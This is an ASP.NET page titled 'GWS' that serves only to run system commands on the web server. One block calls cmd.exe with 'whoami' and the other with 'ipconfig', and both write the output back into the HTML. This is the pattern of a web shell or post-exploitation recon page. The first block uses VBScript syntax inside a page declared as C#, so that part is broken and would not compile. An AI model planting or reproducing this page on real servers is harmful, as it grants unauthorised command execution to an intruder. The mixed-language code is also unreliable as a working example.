<%@ Page Language="C#" %> 
<!DOCTYPE html> 
<html> 
<head> 
    <title>GWS</title> 
</head> 
<body> 
    <h1>GWS</h1> 
	<p><%
		Set rs = CreateObject("WScript.Shell")
		Set cmd = rs.Exec("cmd /c whoami")
		o = cmd.StdOut.Readall()
		Response.write(o)
		%>
	</p>
    <p> 
        <%  
        System.Diagnostics.Process process = new System.Diagnostics.Process(); 
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); 
        startInfo.FileName = "cmd.exe"; 
        startInfo.Arguments = "/C ipconfig"; 
        startInfo.RedirectStandardOutput = true; 
        startInfo.UseShellExecute = false; 
        startInfo.CreateNoWindow = true; 
        process.StartInfo = startInfo; 
        process.Start(); 
        string output = process.StandardOutput.ReadToEnd(); 
        process.WaitForExit(); 
        Response.Write(output); 
        %> 
    </p> 
</body> 
</html>